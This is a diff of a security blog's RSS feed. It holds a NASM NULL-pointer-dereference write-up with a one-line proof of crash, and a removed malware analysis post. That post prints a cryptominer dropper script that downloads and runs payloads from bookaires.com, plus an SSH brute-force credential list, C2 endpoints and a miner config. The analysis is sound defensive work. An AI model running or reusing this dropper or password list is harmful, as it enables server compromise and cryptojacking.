+             * Generally fix things. I think this is right as it is, but
+             * am still not certain.
+             */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                         &lt;span class=&quot;n&quot;&gt;in_absolute&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                         &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, down to a few lines of code, there is a check before the it gets initialized with a valid value which is then skipped because the boolean &lt;code class=&quot;highlighter-rouge&quot;&gt;insn_is_label&lt;/code&gt; is always FALSE.
+Therefore, the &lt;code class=&quot;highlighter-rouge&quot;&gt;result-&amp;gt;label&lt;/code&gt; remains NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/*  forw_ref */&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_NONFATAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                               &lt;span class=&quot;s&quot;&gt;&quot;EQU not preceded by label&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMMEDIATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wrt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NO_SEG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;segment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                 &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_line&lt;/code&gt;, there is a check if the opcode is EQU and surprisingly the nasm_error did not handle the error safely (marked as ERR_NONFATAL).
+The &lt;code class=&quot;highlighter-rouge&quot;&gt;output_ins.label&lt;/code&gt; is then being passed into 3 functions before it gets dereferenced (define_label -&amp;gt; find_label -&amp;gt; islocal).&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;islocal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tasm_compatible_mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boom&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Wed, 05 Sep 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</guid>
         
         
       </item>
@@ -741,530 +1070,9 @@ udevd.lock
 /tmp/notify.file
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/08c6ac693d5d43fb8dec0451fe413e34/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/08c6ac693d5d43fb8dec0451fe413e34/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>03cc8d5deeb63e30f5a5d945abf99b00</title>
-        <description>&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
-&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .nano
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.nano/
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/remote/nano.sh
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x nano.sh
-./nano.sh
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/...
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/.bin/
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/monero.tgz
-&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvf monero.tgz
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; monero.tgz
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp/.bin/
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;nohup&lt;/span&gt; ./start &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null &amp;amp;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
-&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .vd
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/
-curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; sslm.tgz
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/.sslm
-./sparky.sh 192.168 &amp;amp;
-./rand &amp;amp;
-&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/min.sh
-&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/hello
-&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
-&lt;span class=&quot;nb&quot;&gt;exit
-&lt;/span&gt;pkill &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;List of files contained in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslm.tgz&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 08:25 .sslm/
--rwxr-xr-x  0 asoftdoc asoftdoc  764 Aug 24 04:37 .sslm/rx
--rwxrwxr-x  0 asoftdoc asoftdoc  892 Aug 26 09:08 .sslm/sparky.sh
-drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 09:07 .sslm/tsm/
--rwxrwxr-x  0 asoftdoc asoftdoc  861 Aug 26 07:33 .sslm/tsm/a
--rwxr-xr-x  0 asoftdoc asoftdoc  170 Aug 26 07:23 .sslm/tsm/rd
--rwxr-xr-x  0 asoftdoc asoftdoc 1014456 Dec  7  2017 .sslm/tsm/tsm
--rwxrwxr-x  0 asoftdoc asoftdoc     368 Aug 26 06:43 .sslm/tsm/bclass.pl
--rwxrwxr-x  0 asoftdoc asoftdoc      54 Aug 26 08:25 .sslm/tsm/start
--rwxrwxr-x  0 asoftdoc asoftdoc 1040592 Feb  9  2017 .sslm/haiduc
--rwxrwxr-x  0 asoftdoc asoftdoc      65 Aug 26 08:27 .sslm/start
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tsm&lt;/code&gt; is a SSH service brute force binary known as “TSM - The SSH Machine is your machine by Igor Klopov”.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;haiduc&lt;/code&gt; is a 64-bit ELF binary which is used to brute force, enumerate vulnerable hosts, and execute the initial dropper.&lt;/p&gt;
-
-&lt;p&gt;List of usernames and passwords:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nginx nginx
-oracle oracle
-oracle oracle123
-developer developer
-postgres postgres
-postgres 123456
-deploy deploy
-mysql mysql
-mysql 123456
-minecraft minecraft
-minecraft 123456
-admin qwe123
-admin 123qwe
-oracle 1234
-oracle 123456
-oracle password
-root admin
-root rootroot
-root root1
-root abc@1234
-root root12
-root root123
-root root1234
-root admin123
-root admin1234
-root abc123
-root 123abc
-root password
-root P@ssw0rd
-root Q1w2e3r4
-root !QAZ2wsx
-root pass123
-root pass@123
-root pass1234
-root pass@1234
-root live
-root root
-root 1234
-root 123456
-root 12345678
-user user
-user 1234
-user 123456
-user password
-user live
-user user123
-user 12345
-user 123123
-pi raspberry
-ubuntu ubuntu
-ubuntu password
-ubuntu 1234
-ubuntu 12345
-ubuntu 123456
-ubuntu ubuntu123
-ubuntu qwerty
-ubnt ubnt
-ubnt password
-ubnt 1234
-ubnt 12345
-ubnt 123456
-ubnt ubnt123
-ubnt qwerty
-test test
-postgres posgres
-postgres password
-postgres 1234
-admin admin
-admin password
-admin 1234
-admin 123456
-guest guest
-guest password
-guest 1234
-guest 123456
-jenkins jenkins
-jenkins password
-jenkins jenkinspass
-jenkins 1234
-jenkins 123456
-hadoop hadoop
-hadoop password
-hadoop 1234
-hadoop 123456
-nagios nagios
-nagios password
-nagios 1234
-nagios 123456
-dev dev
-zabbix zabbix
-zabbix 1234
-zabbix 123456
-zabbix P@ssw0rd
-zabbix admin
-zabbix zabbix123
-zabbix zabbix1234
-zabbix password
-student student
-student student123
-ts1 ts1
-ts1 123456
-ts1 12345
-ts1 qwerty
-miner miner
-miner miner123
-miner 123456
-miner 12345
-miner 123123
-miner qwerty
-dev dev123
-dev 123123
-dev 123456
-dev qwerty
-developer developer123
-developer 123456
-developer 12345
-developer 123123
-nobody nobody
-admin qwerty
-admin admin123
-test2 test2
-patrick patrick
-julio julio
-usuario usuario
-utilizador utilizador
-utilisateur utilisateur
-administrator administrator
-administrador administrador
-administrateur administrateur
-teste teste
-tester tester
-prueba prueba
-pruebas pruebas
-testing testing
-hospede hospede
-visitor visitor
-visitante visitante
-visiteur visiteur
-kubuntu kubuntu
-lubuntu lubuntu
-xubuntu xubuntu
-lxde lxde
-superadmin superadmin
-superuser superuser
-developpeur developpeur
-deployer deployer
-support support
-suporte suporte
-soporte soporte
-etudiant etudiant
-estudante estudante
-estudiante estudiante
-teacher teacher
-prof prof
-professeur professeur
-professor professor
-profesor profesor
-server server
-serveur serveur
-servidor servidor
-amazon amazon
-csgoserver csgoserver
-dotaserver dotaserver
-wot wot
-wotserver wotserver
-username username
-ts ts
-test1 test1
-ts2 ts2
-usuario 123456
-utilizador 123456
-utilisateur 123456
-administrator 123456
-administrador 123456
-administrateur 123456
-test 123456
-teste 123456
-tester 123456
-prueba 123456
-pruebas 123456
-testing 123456
-hospede 123456
-visitor 123456
-visitante 123456
-visiteur 123456
-kubuntu 123456
-lubuntu 123456
-xubuntu 123456
-lxde 123456
-superadmin 123456
-superuser 123456
-developpeur 123456
-deploy 123456
-deployer 123456
-support 123456
-suporte 123456
-soporte 123456
-student 123456
-etudiant 123456
-estudante 123456
-estudiante 123456
-teacher 123456
-prof 123456
-professeur 123456
-professor 123456
-profesor 123456
-server 123456
-serveur 123456
-servidor 123456
-amazon 123456
-nobody 123456
-csgoserver 123456
-dotaserver 123456
-wot 123456
-wotserver 123456
-username 123456
-ts 123456
-test1 123456
-test2 123456
-ts2 123456
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rx&lt;/code&gt; is a bash shell script used to get the information such as the brute force password list and target IP classes from the domain name &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Information hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bookaires[.]com/feed/feedp.php - password list
-bookaires[.]com/feed/class.php - IP classes
-bookaires[.]com/info.php - C2 endpoint for retrieving information from the victim
-bookaires[.]com/feed/min.sh - Binary dropper script
-bookaires[.]com/feed/remote/rinfo.php - C2 endpoint for registering new deployed miner
-bookaires[.]com/feed/ips.php - List of target IP addresses
-bookaires[.]com/feed/feedonep.php - Feed one random username and password
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;List of files contained in &lt;code class=&quot;highlighter-rouge&quot;&gt;monero.tgz&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 postgres postgres    0 Aug 27 06:32 .bin/
--rwxrwxr-x  0 postgres postgres  166 Aug 27 06:31 .bin/start
--rwxrwxr-x  0 postgres postgres 1196 Aug 27 06:29 .bin/.run
--rwxrwxr-x  0 postgres postgres  511 Aug 27 06:24 .bin/.crondsh
--rwxrwxr-x  0 postgres postgres  773 Aug 27 06:05 .bin/.config.json
--rwxr-xr-x  0 postgres postgres 2731128 Apr 27 06:10 .bin/.cnrig
--rwxr-xr-x  0 postgres postgres  838583 Apr  1  2017 .bin/.h64
--rwxrwxr-x  0 postgres postgres     773 Aug 27 06:05 .bin/.config.json.big
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The miner &lt;code class=&quot;highlighter-rouge&quot;&gt;cnrig&lt;/code&gt; used is compiled on April 27 2018, version 0.1.5. The binary is renamed to &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt; just before the execution.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;h64&lt;/code&gt; is a binary known as “XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002”&lt;/p&gt;
-
-&lt;p&gt;Mining server credentials:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;algo&quot;: &quot;cryptonight&quot;,
-    &quot;api&quot;: {
-        &quot;port&quot;: 0,
-        &quot;access-token&quot;: null,
-        &quot;worker-id&quot;: null,
-        &quot;ipv6&quot;: false,
-        &quot;restricted&quot;: true
-    },
-    &quot;av&quot;: 0,
-    &quot;background&quot;: true,
-    &quot;colors&quot;: true,
-    &quot;cpu-priority&quot;: 0,
-    &quot;donate-level&quot;: 1,
-    &quot;log-file&quot;: null,
-    &quot;max-cpu-usage&quot;: 90,
-    &quot;pools&quot;: [
-        {
-            &quot;url&quot;: &quot;pool.supportxmr.com:5555&quot;,
-            &quot;user&quot;: &quot;42hhyPKkombM6LYEsz6kZe3d1ktHpkkD54Rtv5VZohaAbQAXzmAjkHSDZVWqMm9ieRCjMkijBYhy39ZJrYWVxKDVVqtzwPf&quot;,
-            &quot;pass&quot;: &quot;workx&quot;,
-            &quot;keepalive&quot;: true,
-            &quot;nicehash&quot;: false,
-            &quot;variant&quot;: 1
-        }
-    ],
-    &quot;print-time&quot;: 60,
-    &quot;retries&quot;: 5,
-    &quot;retry-pause&quot;: 5,
-    &quot;safe&quot;: false,
-    &quot;syslog&quot;: false,
-    &quot;threads&quot;: null
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/03cc8d5deeb63e30f5a5d945abf99b00/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/03cc8d5deeb63e30f5a5d945abf99b00/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title>
-        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
-
-&lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
-
-&lt;h1 id=&quot;proof-of-crash&quot;&gt;Proof-of-Crash&lt;/h1&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. echo &quot;equ   push  rax&quot; &amp;gt; poc
-2. nasm -f elf poc
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* an instruction itself */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the label defined, or NULL */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAXPREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* instruction prefixes, if any */&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the opcode - not just the string */&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ccode&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* the condition code, if Jcc/SETcc */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* how many operands? 0-3 (more if db et al) */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;addr_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* address size */&lt;/span&gt;
